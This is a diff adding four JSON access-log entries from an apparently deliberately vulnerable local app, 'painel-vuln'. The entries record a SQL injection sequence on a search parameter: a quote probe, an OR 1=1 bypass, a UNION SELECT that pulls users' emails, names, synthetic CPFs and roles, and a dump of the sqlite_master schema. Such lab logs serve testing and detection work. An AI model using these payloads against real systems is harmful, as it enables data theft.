@@ -1,0 +1,4 @@
+{"ts": 1794948662.6452377, "app": "painel-vuln", "ip": "127.0.0.1", "method": "GET", "path": "/historico?busca=%27", "status": 500}
+{"ts": 1794948663.249871, "app": "painel-vuln", "ip": "127.0.0.1", "method": "GET", "path": "/historico?busca=x%27%20OR%201%3D1%20--", "status": 200}
+{"ts": 1794948663.8531969, "app": "painel-vuln", "ip": "127.0.0.1", "method": "GET", "path": "/historico?busca=zzz%27%20UNION%20SELECT%20email%2C%20nome%2C%20cpf_sintetico%2C%20role%20FROM%20users%20--", "status": 200}
+{"ts": 1794948664.4569209, "app": "painel-vuln", "ip": "127.0.0.1", "method": "GET", "path": "/historico?busca=zzz%27%20UNION%20SELECT%20name%2C%20sql%2C%20%27%27%2C%20%27%27%20FROM%20sqlite_master%20--", "status": 200}
